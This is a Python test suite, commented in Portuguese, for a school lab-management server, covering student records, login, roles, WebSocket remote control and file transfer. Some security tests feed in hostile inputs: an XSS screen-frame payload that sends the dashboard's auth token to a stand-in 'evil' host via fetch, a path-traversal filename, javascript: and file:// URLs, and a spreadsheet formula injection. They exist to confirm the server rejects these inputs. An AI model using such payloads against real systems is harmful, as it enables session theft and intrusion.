"""Testes automatizados do servidor. Execute na raiz do projeto:  python -m unittest discover -s tests -v"""
import asyncio
import json
import os
import socket
import sys
import tempfile
import threading
import time
import unittest
import urllib.error
import urllib.request

# Isola dados e portas ANTES de importar o servidor.
DATA = tempfile.mkdtemp(prefix="gestorlab_test_")
os.environ["GESTORLAB_DATA"] = DATA


def free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


PORT, DISC = free_port(), free_port()
with open(os.path.join(DATA, "server_config.json"), "w", encoding="utf-8") as f:
    json.dump({"port": PORT, "discovery_port": DISC, "open_browser": False, "admin_password": "teste123",
               "max_upload_mb": 1}, f)

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "server"))

import uvicorn  # noqa: E402
import websockets  # noqa: E402

import auth  # noqa: E402
import database  # noqa: E402
import main  # noqa: E402

BASE = f"http://127.0.0.1:{PORT}"


def call(method, path, body=None, token=None, raw=False):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BASE + path, method=method, data=data, headers=headers)
    try:
        with urllib.request.urlopen(req) as resp:
            payload = resp.read()
            return resp.status, (payload if raw else json.loads(payload))
    except urllib.error.HTTPError as e:
        payload = e.read()
        try:
            return e.code, json.loads(payload)
        except ValueError:
            return e.code, payload



async def recv_until(ws, key, value, timeout=5):
    """Lê mensagens até achar uma com msg[key] == value (ignora as demais)."""
    while True:
        msg = json.loads(await asyncio.wait_for(ws.recv(), timeout))
        if msg.get(key) == value:
            return msg

def multipart(fields, files, token):
    """Monta um POST multipart/form-data (fields: {nome: valor}, files: {nome: (arquivo, bytes)})."""
    boundary = "----gestorlab"
    body = b""
    for name, value in fields.items():
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{value}\r\n".encode()
    for name, (filename, content) in files.items():
        body += (f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"; filename=\"{filename}\"\r\n"
                 f"Content-Type: application/octet-stream\r\n\r\n").encode() + content + b"\r\n"
    body += f"--{boundary}--\r\n".encode()
    headers = {"Authorization": f"Bearer {token}", "Content-Type": f"multipart/form-data; boundary={boundary}"}
    return body, headers


class DatabaseTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        database.init_db()

    def test_student_crud_and_login(self):
        ok, student = database.create_student("Ana Souza", "T100", "1A", "segredo")
        self.assertTrue(ok)
        self.assertFalse(database.create_student("Outra", "T100", "", "x")[0])      # matrícula duplicada
        self.assertTrue(database.verify_student_login("T100", "segredo")[0])
        self.assertFalse(database.verify_student_login("T100", "errada")[0])
        self.assertTrue(database.update_student(student["id"], "Ana S.", "1B", None, "nova")[0])
        self.assertTrue(database.verify_student_login("T100", "nova")[0])
        self.assertFalse(database.update_student(99999, "X", "")[0])
        self.assertTrue(database.delete_student(student["id"])[0])
        self.assertFalse(database.verify_student_login("T100", "nova")[0])

    def test_attendance_sessions(self):
        database.record_attendance("A1", "Aluno Um", "PC-01", "10.0.0.1")
        database.record_attendance("A2", "Aluno Dois", "PC-01", "10.0.0.1")   # troca de aluno no mesmo PC
        rows = [r for r in database.list_attendance(query="PC-01")]
        by_mat = {r["matricula"]: r for r in rows}
        self.assertIsNotNone(by_mat["A1"]["logout_at"])      # sessão anterior foi encerrada
        self.assertIsNone(by_mat["A2"]["logout_at"])
        database.close_attendance("PC-01")
        self.assertIsNotNone(database.list_attendance(query="A2")[0]["logout_at"])

    def test_open_session_closed_at_last_seen(self):
        """Servidor desligado com sessão aberta: ao reiniciar, a saída é o último sinal de vida."""
        database.record_attendance("LS1", "Aluno LS", "PC-LS", "10.0.0.9")
        with database.connect() as conn:
            conn.execute("UPDATE attendance SET login_at = '2026-01-01 10:00:00', "
                         "last_seen = '2026-01-01 10:30:00' WHERE matricula = 'LS1'")
        database.init_db()
        self.assertEqual(database.list_attendance(query="LS1")[0]["logout_at"], "2026-01-01 10:30:00")

    def test_parse_students_csv(self):
        excel = "Matrícula;Nome;Turma;Senha\r\nC1;José Ávila;3º B;abc\r\n\r\nC2;Maria;3º B;\r\n".encode("cp1252")
        rows, error = database.parse_students_csv(excel)
        self.assertIsNone(error)
        self.assertEqual([r[1]["matricula"] for r in rows], ["C1", "C2"])
        self.assertEqual(rows[0][1]["name"], "José Ávila")
        # sem cabeçalho, separado por vírgula: ordem matrícula, nome, turma, senha
        rows, error = database.parse_students_csv("C3,Pedro,1A,xyz\n".encode("utf-8"))
        self.assertEqual(rows[0][1], {"matricula": "C3", "name": "Pedro", "turma": "1A", "password": "xyz"})
        # cabeçalho em outra ordem
        rows, _ = database.parse_students_csv("nome;turma;ra\nLia;2B;C4\n".encode("utf-8"))
        self.assertEqual(rows[0][1], {"name": "Lia", "turma": "2B", "matricula": "C4"})
        self.assertIsNotNone(database.parse_students_csv(b"")[1])

    def test_import_students(self):
        rows = [(1, {"matricula": "I1", "name": "Um", "turma": "A", "password": "s1"}),
                (2, {"matricula": "I2", "name": "Dois"}),                 # senha em branco = matrícula
                (3, {"matricula": "I1", "name": "Repetido"}),
                (4, {"matricula": "", "name": "Sem matrícula"})]
        result = database.import_students(rows)
        self.assertEqual((result["created"], result["updated"], len(result["errors"])), (2, 0, 2))
        self.assertTrue(database.verify_student_login("I1", "s1")[0])
        self.assertTrue(database.verify_student_login("I2", "I2")[0])
        # já cadastrados: ignorados, a menos que se peça para atualizar
        again = database.import_students([(1, {"matricula": "I2", "name": "Dois Novo", "turma": "B"})])
        self.assertEqual(again["created"] + again["updated"], 0)
        again = database.import_students([(1, {"matricula": "I2", "name": "Dois Novo", "turma": "B"})], True)
        self.assertEqual(again["updated"], 1)
        self.assertEqual(database.get_student_by_matricula("I2")["name"], "Dois Novo")
        self.assertTrue(database.verify_student_login("I2", "I2")[0])   # senha não informada: mantida


class AuthTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        database.init_db()

    def test_token_roundtrip_and_tamper(self):
        token = auth.create_access_token(database.get_user_by_email("admin"))
        self.assertEqual(auth.verify_token(token)["email"], "admin")
        self.assertIsNone(auth.verify_token(token[:-4] + "AAAA"))
        self.assertIsNone(auth.verify_token(""))
        self.assertIsNone(auth.verify_token("lixo"))

    def test_token_invalid_after_password_change_or_deactivation(self):
        ok, user = database.create_user("tok@escola.org", "Pessoa Token", "admin", "senha-longa-1", must_change=False)
        self.assertTrue(ok)
        token = auth.create_access_token(database.get_user_by_email("tok@escola.org"))
        self.assertTrue(auth.verify_token(token))
        database.set_user_password(user["id"], "outra-senha-2", False)
        self.assertIsNone(auth.verify_token(token))               # trocar a senha derruba as sessões
        token = auth.create_access_token(database.get_user_by_email("tok@escola.org"))
        self.assertTrue(auth.verify_token(token))
        database.update_user(user["id"], "Pessoa Token", "admin", False)
        self.assertIsNone(auth.verify_token(token))               # conta desativada

    def test_rate_limiter(self):
        limiter = auth.RateLimiter(max_fails=3, window=60)
        for _ in range(3):
            limiter.fail("ip")
        self.assertTrue(limiter.blocked("ip"))
        limiter.reset("ip")
        self.assertFalse(limiter.blocked("ip"))


class ServerTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        config = uvicorn.Config(main.app, host="127.0.0.1", port=PORT, log_level="warning")
        cls.server = uvicorn.Server(config)
        cls.thread = threading.Thread(target=cls.server.run, daemon=True)
        cls.thread.start()
        for _ in range(100):
            try:
                urllib.request.urlopen(BASE + "/", timeout=1)
                break
            except OSError:
                time.sleep(0.1)
        main.login_limiter._fails.clear()
        status, data = call("POST", "/api/login", {"email": "admin", "password": "teste123"})
        assert status == 200, data
        cls.token = data["token"]

    @classmethod
    def tearDownClass(cls):
        cls.server.should_exit = True
        cls.thread.join(timeout=5)

    def test_auth_required(self):
        self.assertEqual(call("GET", "/api/students")[0], 401)
        self.assertEqual(call("GET", "/api/attendance")[0], 401)
        self.assertEqual(call("GET", "/api/students", token=self.token)[0], 200)

    def test_wrong_password_rate_limited(self):
        main.login_limiter._fails.clear()
        codes = [call("POST", "/api/login", {"email": "admin", "password": "errada"})[0] for _ in range(6)]
        self.assertEqual(codes[0], 401)
        self.assertEqual(codes[-1], 429)
        main.login_limiter._fails.clear()

    def test_student_api(self):
        status, data = call("POST", "/api/students", {"name": "Bia", "matricula": "API1", "password": "p"}, self.token)
        self.assertEqual(status, 200)
        self.assertEqual(call("POST", "/api/students", {"name": "Bia", "matricula": "API1", "password": "p"},
                              self.token)[0], 400)
        self.assertEqual(call("POST", "/api/student/verify-login", {"matricula": "API1", "password": "p"})[0], 200)
        self.assertEqual(call("POST", "/api/student/verify-login", {"matricula": "API1", "password": "x"})[0], 401)
        self.assertEqual(call("DELETE", f"/api/students/{data['student']['id']}", token=self.token)[0], 200)

    def test_agent_flow(self):
        """Agente registra, recebe pausa/retoma conforme o painel, comandos, arquivo e gera presença."""
        async def scenario():
            url = f"ws://127.0.0.1:{PORT}"
            async with websockets.connect(f"{url}/ws/client") as agent:
                await agent.send(json.dumps({"type": "register", "hostname": "PC-T1"}))
                self.assertEqual(json.loads(await agent.recv())["type"], "registered")
                # o agente recebe as regras de uso logo ao conectar
                self.assertEqual(json.loads(await agent.recv())["action"], "set_rules")
                # nenhum painel aberto: o servidor manda pausar o envio de telas
                self.assertEqual(json.loads(await agent.recv())["action"], "stream_pause")

                async with websockets.connect(f"{url}/ws/dashboard?token={self.token}") as dash:
                    init = json.loads(await dash.recv())
                    self.assertEqual([c["info"]["hostname"] for c in init["clients"]], ["PC-T1"])
                    self.assertEqual(json.loads(await agent.recv())["action"], "stream_resume")

                    # comando de bloqueio chega ao agente
                    await dash.send(json.dumps({"action": "lock", "target": "PC-T1-127.0.0.1"}))
                    self.assertEqual(json.loads(await agent.recv())["action"], "lock")
                    # ação desconhecida é ignorada
                    await dash.send(json.dumps({"action": "formatar", "target": "all"}))

                    # login do aluno gera presença e aviso ao painel
                    await agent.send(json.dumps({"type": "student_login_update", "student_name": "Caio",
                                                 "matricula": "P77", "is_logged_in": True}))
                    update = json.loads(await dash.recv())
                    while update["type"] != "student_login_update":
                        update = json.loads(await dash.recv())
                    self.assertEqual(update["matricula"], "P77")

                # painel fechou: agente volta ao padrão e pausa
                self.assertEqual(json.loads(await agent.recv())["action"], "reset_stream")
                self.assertEqual(json.loads(await agent.recv())["action"], "stream_pause")

            await asyncio.sleep(0.3)   # desconexão encerra a sessão de presença

        asyncio.run(scenario())
        rows = database.list_attendance(query="P77")
        self.assertEqual(len(rows), 1)
        self.assertIsNotNone(rows[0]["logout_at"])
        status, data = call("GET", "/api/attendance?q=P77", token=self.token)
        self.assertEqual(data["records"][0]["student_name"], "Caio")
        status, csv_bytes = call("GET", "/api/attendance.csv?q=P77", token=self.token, raw=True)
        self.assertIn("Caio", csv_bytes.decode("utf-8-sig"))

    def test_file_transfer_limits_and_delivery(self):
        boundary = "----t"

        def upload(name, content, target):
            body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\n{target}\r\n"
                    f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{name}\"\r\n"
                    f"Content-Type: application/octet-stream\r\n\r\n").encode() + content + f"\r\n--{boundary}--\r\n".encode()
            req = urllib.request.Request(BASE + "/api/file-transfer", data=body, method="POST", headers={
                "Authorization": f"Bearer {self.token}", "Content-Type": f"multipart/form-data; boundary={boundary}"})
            try:
                with urllib.request.urlopen(req) as r:
                    return r.status, json.loads(r.read())
            except urllib.error.HTTPError as e:
                return e.code, json.loads(e.read())

        self.assertEqual(upload("grande.bin", b"x" * (1024 * 1024 + 10), "all")[0], 413)   # limite de 1 MB
        self.assertEqual(upload("a.txt", b"oi", "nao-existe")[0], 404)

        async def scenario():
            async with websockets.connect(f"ws://127.0.0.1:{PORT}/ws/client") as agent:
                await agent.send(json.dumps({"type": "register", "hostname": "PC-T2"}))
                await agent.recv()   # registered
                loop = asyncio.get_running_loop()
                result = loop.run_in_executor(None, upload, "..\\..\\evil.txt", b"oi", "PC-T2-127.0.0.1")
                while True:
                    msg = json.loads(await agent.recv())
                    if msg.get("action") == "receive_file":
                        break
                status, data = await result
                return status, data, msg

        status, data, msg = asyncio.run(scenario())
        self.assertEqual(status, 200)
        self.assertEqual(msg["filename"], "evil.txt")      # caminho removido
        self.assertEqual(data["sent_count"], 1)

    def test_password_change_api(self):
        url = "/api/me/password"
        main.login_limiter._fails.clear()
        self.assertEqual(call("POST", url, {"current_password": "x", "new_password": "nova12345"}, self.token)[0], 400)
        self.assertEqual(call("POST", url, {"current_password": "teste123", "new_password": "curta"}, self.token)[0], 400)
        status, data = call("POST", url, {"current_password": "teste123", "new_password": "nova12345"}, self.token)
        self.assertEqual(status, 200)
        new_token = data["token"]
        try:
            self.assertEqual(call("GET", "/api/students", token=self.token)[0], 401)   # token antigo morreu
            self.assertEqual(call("GET", "/api/students", token=new_token)[0], 200)
            self.assertEqual(call("POST", "/api/login", {"email": "admin", "password": "teste123"})[0], 401)
        finally:
            status, data = call("POST", url, {"current_password": "nova12345", "new_password": "teste123"}, new_token)
            self.assertEqual(status, 200)
            type(self).token = data["token"]
            main.login_limiter._fails.clear()

    def test_team_accounts_flow(self):
        main.login_limiter._fails.clear()
        # administrador cria contas: senha provisória aparece uma única vez
        status, data = call("POST", "/api/users", {"email": "Ana.Tecnica@Escola.org", "name": "Ana Técnica", "role": "operador"},
                            self.token)
        self.assertEqual(status, 200)
        ana, temp = data["user"], data["user"]["temp_password"]
        self.assertEqual(ana["email"], "ana.tecnica@escola.org")
        self.assertTrue(len(temp) >= 10)
        self.assertEqual(call("POST", "/api/users", {"email": "ana.tecnica@escola.org", "name": "Repetida"}, self.token)[0], 400)
        self.assertEqual(call("POST", "/api/users", {"email": "sem-arroba", "name": "X"}, self.token)[0], 400)
        self.assertNotIn("password_hash", json.dumps(call("GET", "/api/users", token=self.token)[1]))

        # login com senha provisória: só consegue trocar a senha
        status, login = call("POST", "/api/login", {"email": "ANA.TECNICA@escola.org", "password": temp})
        self.assertEqual(status, 200)
        self.assertTrue(login["user"]["must_change"])
        tok = login["token"]
        self.assertEqual(call("GET", "/api/students", token=tok)[0], 403)
        self.assertEqual(call("POST", "/api/me/password", {"current_password": temp, "new_password": "SenhaNova123"}, tok)[0], 200)
        status, login = call("POST", "/api/login", {"email": "ana.tecnica@escola.org", "password": "SenhaNova123"})
        self.assertEqual(status, 200)
        self.assertFalse(login["user"]["must_change"])
        tok = login["token"]
        self.assertEqual(call("GET", "/api/students", token=tok)[0], 200)

        # operador não apaga alunos, não importa, não mexe nas regras nem na equipe
        self.assertEqual(call("DELETE", "/api/students/999999", token=tok)[0], 403)
        self.assertEqual(call("POST", "/api/students/bulk-delete", {"ids": [1]}, tok)[0], 403)
        self.assertEqual(call("PUT", "/api/rules", {"enabled": False, "programs": [], "sites": []}, tok)[0], 403)
        self.assertEqual(call("GET", "/api/users", token=tok)[0], 403)
        self.assertEqual(call("GET", "/api/audit", token=tok)[0], 403)
        # ...mas cadastra aluno e usa o painel
        status, st = call("POST", "/api/students", {"name": "Aluno do Operador", "matricula": "OP-1", "password": "x"}, tok)
        self.assertEqual(status, 200)

        # desativar derruba a sessão e impede novo login
        self.assertEqual(call("PUT", f"/api/users/{ana['id']}", {"name": "Ana Técnica", "role": "operador", "active": False},
                              self.token)[0], 200)
        self.assertEqual(call("GET", "/api/students", token=tok)[0], 401)
        self.assertEqual(call("POST", "/api/login", {"email": "ana.tecnica@escola.org", "password": "SenhaNova123"})[0], 401)

        # redefinir senha gera nova provisória e exige troca
        self.assertEqual(call("PUT", f"/api/users/{ana['id']}", {"name": "Ana Técnica", "role": "operador", "active": True},
                              self.token)[0], 200)
        status, reset = call("POST", f"/api/users/{ana['id']}/reset-password", token=self.token)
        self.assertEqual(status, 200)
        status, login = call("POST", "/api/login", {"email": "ana.tecnica@escola.org", "password": reset["temp_password"]})
        self.assertTrue(login["user"]["must_change"])

        # o registro mostra quem fez o quê
        actions = [(r["user_email"], r["action"]) for r in call("GET", "/api/audit", token=self.token)[1]["records"]]
        self.assertIn(("ana.tecnica@escola.org", "cadastrou aluno"), actions)
        self.assertIn(("admin", "criou conta"), actions)

        # nunca fica sem administrador, nem exclui a si mesmo
        me = next(u for u in call("GET", "/api/users", token=self.token)[1]["users"] if u["email"] == "admin")
        self.assertEqual(call("DELETE", f"/api/users/{me['id']}", token=self.token)[0], 400)
        self.assertEqual(call("DELETE", f"/api/users/{ana['id']}", token=self.token)[0], 200)

    def test_last_admin_is_protected(self):
        users = database.list_users()
        admins = [u for u in users if u["role"] == "admin" and u["active"]]
        for extra in admins[1:]:
            database.update_user(extra["id"], extra["name"], "operador", True)
        sole = admins[0]
        self.assertFalse(database.update_user(sole["id"], sole["name"], "operador", True)[0])
        self.assertFalse(database.update_user(sole["id"], sole["name"], "admin", False)[0])
        self.assertFalse(database.delete_user(sole["id"])[0])
        for extra in admins[1:]:
            database.update_user(extra["id"], extra["name"], "admin", True)

    def test_students_import_export_api(self):
        csv_bytes = "Matrícula;Nome;Turma\nAPI-I1;Rita Import;9A\n".encode("cp1252")
        body, headers = multipart({"update_existing": "false"}, {"file": ("alunos.csv", csv_bytes)}, self.token)
        req = urllib.request.Request(BASE + "/api/students/import", data=body, method="POST", headers=headers)
        with urllib.request.urlopen(req) as r:
            data = json.loads(r.read())
        self.assertEqual(data["created"], 1)
        status, exported = call("GET", "/api/students.csv", token=self.token, raw=True)
        self.assertEqual(status, 200)
        self.assertIn("Rita Import", exported.decode("utf-8-sig"))
        self.assertEqual(call("GET", "/api/students.csv")[0], 401)

    def test_open_url_only_http(self):
        async def scenario():
            url = f"ws://127.0.0.1:{PORT}"
            async with websockets.connect(f"{url}/ws/client") as agent:
                await agent.send(json.dumps({"type": "register", "hostname": "PC-URL"}))
                await agent.recv()
                async with websockets.connect(f"{url}/ws/dashboard?token={self.token}") as dash:
                    await dash.recv()
                    for bad in ("file:///C:/Windows/System32/cmd.exe", "javascript:alert(1)", "ftp://x"):
                        await dash.send(json.dumps({"action": "open_url", "target": "all", "url": bad}))
                    await dash.send(json.dumps({"action": "open_url", "target": "all", "url": "https://escola.br"}))
                    while True:
                        msg = json.loads(await asyncio.wait_for(agent.recv(), 5))
                        if msg.get("action") == "open_url":
                            return msg

        self.assertEqual(asyncio.run(scenario())["url"], "https://escola.br")

    def test_rules_api_normalizes_and_pushes(self):
        async def scenario():
            async with websockets.connect(f"ws://127.0.0.1:{PORT}/ws/client") as agent:
                await agent.send(json.dumps({"type": "register", "hostname": "PC-REGRAS"}))
                await recv_until(agent, "action", "set_rules")      # regras do registro
                loop = asyncio.get_running_loop()
                result = loop.run_in_executor(None, lambda: call("PUT", "/api/rules", {
                    "enabled": True,
                    "programs": ["Roblox", "explorer.exe", "C:\\Jogos\\jogo.exe", "roblox.exe"],
                    "sites": ["https://www.youtube.com/watch?v=1", "tv", "TikTok", "pt.khanacademy.org"],
                }, self.token))
                pushed = await recv_until(agent, "action", "set_rules")
                return pushed, await result

        try:
            pushed, (status, data) = asyncio.run(scenario())
            self.assertEqual(status, 200)
            self.assertEqual(data["programs"], ["Roblox.exe", "jogo.exe"])        # protegido e repetido saem
            self.assertEqual(data["sites"], ["youtube", "TikTok", "khanacademy"])  # endereço vira palavra
            self.assertEqual(data["sent_count"], 1)
            self.assertTrue(pushed["enabled"])
            self.assertEqual(pushed["programs"], data["programs"])
            with open(os.path.join(DATA, "server_config.json"), encoding="utf-8") as f:
                self.assertEqual(json.load(f)["blocked_sites"], data["sites"])
            self.assertEqual(call("GET", "/api/rules", token=self.token)[1]["programs"], data["programs"])
        finally:
            call("PUT", "/api/rules", {"enabled": False, "programs": [], "sites": []}, self.token)

    def test_turma_target_and_lock_timer(self):
        database.create_student("Turma Teste", "TT-1", "9B", "s")

        async def scenario():
            url = f"ws://127.0.0.1:{PORT}"
            async with websockets.connect(f"{url}/ws/client") as a, websockets.connect(f"{url}/ws/client") as b:
                await a.send(json.dumps({"type": "register", "hostname": "PC-9B"}))
                await b.send(json.dumps({"type": "register", "hostname": "PC-OUTRO"}))
                await a.recv()
                await b.recv()
                async with websockets.connect(f"{url}/ws/dashboard?token={self.token}") as dash:
                    await dash.recv()   # init
                    await a.send(json.dumps({"type": "student_login_update", "student_name": "Turma Teste",
                                             "matricula": "TT-1", "is_logged_in": True}))
                    login = await recv_until(dash, "type", "student_login_update")
                    self.assertEqual(login["turma"], "9B")    # turma vem do cadastro

                    await dash.send(json.dumps({"action": "lock", "target": "turma:9b", "duration": 120,
                                                "message": "Prova"}))
                    lock = await recv_until(a, "action", "lock")
                    self.assertEqual((lock["duration"], lock["message"]), (120, "Prova"))
                    status = await recv_until(dash, "type", "status_update")
                    self.assertTrue(119 <= status["lock_remaining"] <= 120)
                    # o outro computador (sem turma) não foi bloqueado
                    with self.assertRaises(asyncio.TimeoutError):
                        await recv_until(b, "action", "lock", timeout=0.6)

                    # o agente avisa que o timer acabou: painel recebe desbloqueio
                    await a.send(json.dumps({"type": "status_ack", "is_locked": False}))
                    status = await recv_until(dash, "type", "status_update")
                    self.assertEqual((status["is_locked"], status["lock_remaining"]), (False, 0))

        asyncio.run(scenario())

    def test_rule_violation_recorded(self):
        async def scenario():
            url = f"ws://127.0.0.1:{PORT}"
            async with websockets.connect(f"{url}/ws/client") as agent:
                await agent.send(json.dumps({"type": "register", "hostname": "PC-OCORR", "student_name": "Gil"}))
                await agent.recv()
                async with websockets.connect(f"{url}/ws/dashboard?token={self.token}") as dash:
                    await dash.recv()
                    await agent.send(json.dumps({"type": "rule_violation", "kind": "site", "detail": "youtube"}))
                    return await recv_until(dash, "type", "rule_violation")

        alert = asyncio.run(scenario())
        self.assertEqual((alert["hostname"], alert["kind"], alert["detail"]), ("PC-OCORR", "site", "youtube"))
        events = call("GET", "/api/events", token=self.token)[1]["events"]
        self.assertEqual((events[0]["hostname"], events[0]["student_name"]), ("PC-OCORR", "Gil"))
        self.assertEqual(call("GET", "/api/events")[0], 401)

    def test_forged_screen_frame_is_rejected(self):
        """Quadro com HTML/URL (XSS no painel) não pode ser guardado nem repassado."""
        evil = 'x" onerror="fetch(`//evil/`+localStorage.gestorlab_auth_token)" data-x="'
        good = "data:image/jpeg;base64,/9j/4AAQSkZJRg=="

        async def scenario():
            url = f"ws://127.0.0.1:{PORT}"
            async with websockets.connect(f"{url}/ws/client") as agent:
                await agent.send(json.dumps({"type": "register", "hostname": "PC-XSS", "id": "PC-VITIMA-1.2.3.4"}))
                await agent.recv()
                async with websockets.connect(f"{url}/ws/dashboard?token={self.token}") as dash:
                    init = json.loads(await dash.recv())
                    ids = [c["id"] for c in init["clients"]]
                    for bad in (evil, "javascript:alert(1)", "https://evil/x.jpg", "data:text/html;base64,PHNjcmlwdD4=",
                                "data:image/jpeg;base64," + "A" * (5 * 1024 * 1024)):
                        await agent.send(json.dumps({"type": "screen_frame", "data": bad}))
                    await agent.send(json.dumps({"type": "screen_frame", "data": good}))
                    frame = await recv_until(dash, "type", "screen_frame")
                    return ids, frame["data"]

        ids, delivered = asyncio.run(scenario())
        self.assertEqual(delivered, "data:image/jpeg;base64,/9j/4AAQSkZJRg==")   # só o quadro válido chegou
        self.assertIn("PC-XSS-127.0.0.1", ids)          # id vem do servidor, não do agente
        self.assertNotIn("PC-VITIMA-1.2.3.4", ids)

    def test_csv_export_neutralizes_formulas(self):
        database.create_student("=HYPERLINK(\"http://evil\")", "CSV-1", "9X", "s")
        status, data = call("GET", "/api/students.csv", token=self.token, raw=True)
        text = data.decode("utf-8-sig")
        self.assertIn("'=HYPERLINK", text)
        self.assertNotIn(";=HYPERLINK", text)

    def test_events_table_is_capped(self):
        for i in range(5010):
            database.record_event("PC-CAP", "", "site", str(i)) if i % 500 == 0 else None
        with database.connect() as conn:
            conn.executemany("INSERT INTO events (hostname, kind, detail) VALUES ('PC-CAP', 'site', ?)",
                             [(str(i),) for i in range(5200)])
        database.record_event("PC-CAP", "", "site", "ultimo")
        with database.connect() as conn:
            self.assertLessEqual(conn.execute("SELECT COUNT(*) FROM events").fetchone()[0], 5001)

    def test_reconnect_keeps_new_connection(self):
        async def scenario():
            url = f"ws://127.0.0.1:{PORT}/ws/client"
            first = await websockets.connect(url)
            await first.send(json.dumps({"type": "register", "hostname": "PC-T3"}))
            await first.recv()
            second = await websockets.connect(url)
            await second.send(json.dumps({"type": "register", "hostname": "PC-T3"}))
            await second.recv()
            await asyncio.sleep(0.4)   # a conexão antiga cai; a nova deve continuar registrada
            status, info = await asyncio.get_running_loop().run_in_executor(
                None, lambda: call("GET", "/api/server-info", token=self.token))
            await second.close()
            return info["clients"]

        self.assertIn("PC-T3-127.0.0.1", asyncio.run(scenario()))


if __name__ == "__main__":
    unittest.main()
